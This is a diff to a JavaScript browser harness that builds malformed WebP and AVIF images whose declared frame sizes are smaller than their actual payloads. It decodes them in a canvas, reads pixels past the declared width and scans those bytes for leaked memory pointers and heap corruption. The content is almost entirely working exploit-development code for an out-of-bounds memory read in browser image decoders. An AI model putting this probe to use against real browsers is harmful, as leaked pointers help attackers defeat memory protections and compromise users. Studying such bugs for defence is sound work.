@@ -75,7 +75,8 @@ function riff(chunks) {
   var body = [];
   for (var i = 0; i < chunks.length; i++) body = body.concat(chunks[i]);
   var out = [0x52, 0x49, 0x46, 0x46]; // RIFF
-  out.push(body.length & 255, (body.length >>> 8) & 255, (body.length >>> 16) & 255, (body.length >>> 24) & 255);
+  var riffSize = body.length + 4;      // 'WEBP' + body
+  out.push(riffSize & 255, (riffSize >>> 8) & 255, (riffSize >>> 16) & 255, (riffSize >>> 24) & 255);
   out.push(0x57, 0x45, 0x42, 0x50); // WEBP
   return out.concat(body);
 }
@@ -145,24 +146,24 @@ function checkSentinels(s) {
 
 /* =============================== variants =============================== */
 var VARIANTS = [
-  { id: 'W1-webp-calib-16x1', kind: 'webp', canvas: [32, 32], frames: [
+  { id: 'W1-webp-calib-16x1', kind: 'webp', canvas: [32, 32], declared: [16,1], payload: [16,1], frames: [
       { x: 0, y: 0, w: 16, h: 1, payloadKey: 'vp8l_16_VP8L' }] },
-  { id: 'W2-webp-mismatch-8x1-payload16', kind: 'webp', canvas: [32, 32], frames: [
+  { id: 'W2-webp-mismatch-8x1-payload16', kind: 'webp', canvas: [32, 32], declared: [8,1], payload: [16,1], frames: [
       { x: 0, y: 0, w: 8, h: 1, payloadKey: 'vp8l_16_VP8L' }] },
-  { id: 'W3-webp-mismatch-8x1-lossy16', kind: 'webp', canvas: [32, 32], frames: [
+  { id: 'W3-webp-mismatch-8x1-lossy16', kind: 'webp', canvas: [32, 32], declared: [8,1], payload: [16,1], frames: [
       { x: 0, y: 0, w: 8, h: 1, payloadKey: 'vp8_16_VP8' }] },
-  { id: 'W4-webp-mismatch-1x1-payload16', kind: 'webp', canvas: [32, 32], frames: [
+  { id: 'W4-webp-mismatch-1x1-payload16', kind: 'webp', canvas: [32, 32], declared: [1,1], payload: [16,1], frames: [
       { x: 0, y: 0, w: 1, h: 1, payloadKey: 'vp8l_16_VP8L' }] },
   { id: 'W5-webp-offsets-FFFE', kind: 'webp', canvas: [32, 32], frames: [
       { x: 0xFFFE, y: 0xFFFE, w: 8, h: 1, payloadKey: 'vp8l_16_VP8L' }] },
   { id: 'W6-webp-canvas1x1-frame8x1', kind: 'webp', canvas: [1, 1], frames: [
       { x: 0, y: 0, w: 8, h: 1, payloadKey: 'vp8l_16_VP8L' }] },
-  { id: 'W7-webp-9x1-into-8x1', kind: 'webp', canvas: [32, 32], frames: [
+  { id: 'W7-webp-9x1-into-8x1', kind: 'webp', canvas: [32, 32], declared: [8,1], payload: [9,1], frames: [
       { x: 0, y: 0, w: 8, h: 1, payloadKey: 'vp8l_9_VP8L' }] },
   { id: 'W8-webp-two-frames-second-mismatch', kind: 'webp', canvas: [32, 32], frames: [
       { x: 0, y: 0, w: 16, h: 1, payloadKey: 'vp8l_16_VP8L' },
       { x: 0, y: 0, w: 8, h: 1, payloadKey: 'vp8l_16_VP8L' }] },
-  { id: 'W9-webp-64x1-into-8x1', kind: 'webp', canvas: [64, 8], frames: [
+  { id: 'W9-webp-64x1-into-8x1', kind: 'webp', canvas: [64, 8], declared: [8,1], payload: [64,1], frames: [
       { x: 0, y: 0, w: 8, h: 1, payloadKey: 'vp8l_64_VP8L' }] },
   { id: 'A1-avif-valid-64x64', kind: 'avif', b64: 'AVIF_VALID_B64' },
   { id: 'A2-avif-ispe32-payload64', kind: 'avif', b64: 'AVIF_ISPE32_B64' }
@@ -175,7 +176,8 @@ function resultLine(state, extra) {
   rows.push({ id: VARIANTS[pos].id, state: state, ptr: r.ptr || 0, foreign: r.foreign || 0,
     best: r.cands && r.cands.length ? r.cands[0].hex : '-', corrupt: r.corrupt || 0 });
   bk('ROW', VARIANTS[pos].id + ' | state=' + state + ' | foreign=' + (r.foreign || 0) +
-    'B | ptrcands=' + (r.ptr || 0) + ' | corrupt=' + (r.corrupt || 0) + ' | best=' +
+    'B | ptrcands=' + (r.ptr || 0) + ' | corrupt=' + (r.corrupt || 0) +
+    (r.oob ? ' | oob=' + r.oob.bytes + 'B/ptr' + r.oob.cands + '/hex=' + r.oob.hex.slice(0, 32) : '') + ' | best=' +
     (r.cands && r.cands.length ? r.cands[0].hex : '-'));
 }
 function finish() {
@@ -216,17 +218,42 @@ function runNext() {
     try {
       var cv = document.createElement('canvas');
       var nw = Math.max(img.naturalWidth || 1, 1), nh = Math.max(img.naturalHeight || 1, 1);
-      cv.width = Math.min(Math.max(nw, 256), 512); cv.height = Math.min(Math.max(nh, 256), 512);
+      // рисуем 1:1 в natural-размере (масштаб исказил бы OOB-пиксели) + отдельно масштаб для полноты
+      cv.width = Math.min(nw, 512); cv.height = Math.min(nh, 512);
       var cx = cv.getContext('2d');
       cx.fillStyle = '#000'; cx.fillRect(0, 0, cv.width, cv.height);
-      cx.drawImage(img, 0, 0, cv.width, cv.height);
-      var scan = scanPixels(cx.getImageData(0, 0, cv.width, cv.height));
+      cx.drawImage(img, 0, 0);
+      var full = cx.getImageData(0, 0, cv.width, cv.height);
+      var scan = scanPixels(full);
+      // целевой OOB-регион: пиксели кадра за пределами объявленной ширины
+      var oob = null;
+      if (V.declared && V.payload) {
+        var dw = V.declared[0], dh = V.declared[1], pw = V.payload[0];
+        var x0 = Math.min(dw, cv.width), x1 = Math.min(Math.max(pw, dw), cv.width);
+        var y1 = Math.min(Math.max(V.payload[1], dh), cv.height);
+        var region = new Uint8Array(Math.max(0, (x1 - x0)) * Math.max(1, y1) * 4), k = 0;
+        for (var yy = 0; yy < y1; yy++) for (var xx = x0; xx < x1; xx++) {
+          var o = (yy * cv.width + xx) * 4;
+          region[k++] = full.data[o]; region[k++] = full.data[o + 1]; region[k++] = full.data[o + 2]; region[k++] = full.data[o + 3];
+        }
+        var rscan = { total: region.length, foreign: 0, cands: [] };
+        for (var q = 0; q + 8 <= region.length; q += 8) {
+          var vv = 0n; for (var qq = 7; qq >= 0; qq--) vv = (vv << 8n) | BigInt(region[q + qq]);
+          var kk = isPtrCandidate(vv);
+          if (kk) { var hh = vv.toString(16); while (hh.length < 16) hh = '0' + hh; rscan.cands.push({ off: q, kind: kk, hex: '0x' + hh }); }
+        }
+        var hexs = ''; for (var hx = 0; hx < Math.min(region.length, 64); hx++) hexs += ('0' + region[hx].toString(16)).slice(-2);
+        oob = { bytes: region.length, cands: rscan.cands.length, hex: hexs };
+        bk('OOB-REGION', V.id + ' bytes=' + region.length + ' ptrcands=' + rscan.cands.length + ' hex=' + hexs);
+        rscan.cands.forEach(function (c) { bk('PTRCAND', V.id + ' region off=' + c.off + ' kind=' + c.kind + ' ' + c.hex); });
+        if (rscan.cands.length) scan.cands = scan.cands.concat(rscan.cands);
+      }
       var corr = checkSentinels(sent);
       var corrupt = (corr.diff > 0 ? 1 : 0) + (corr.cvDiff ? 1 : 0);
       if (corrupt) bk('CORRUPTION', V.id + ' arrDiff=' + corr.diff + ' first=' + corr.first +
         ' byte=0x' + (corr.firstByte & 255).toString(16) + ' cvDiff=' + corr.cvDiff);
       if (scan.cands.length) scan.cands.forEach(function (c) { bk('PTRCAND', V.id + ' off=' + c.off + ' kind=' + c.kind + ' ' + c.hex); });
-      resultLine('decoded', { foreign: scan.foreign, ptr: scan.cands.length, cands: scan.cands, corrupt: corrupt });
+      resultLine('decoded', { foreign: scan.foreign, ptr: scan.cands.length, cands: scan.cands, corrupt: corrupt, oob: oob });
     } catch (e) { bk('READ-ERR', V.id + ' ' + e); resultLine('read-err', {}); }
     pos++; runNext();
   };
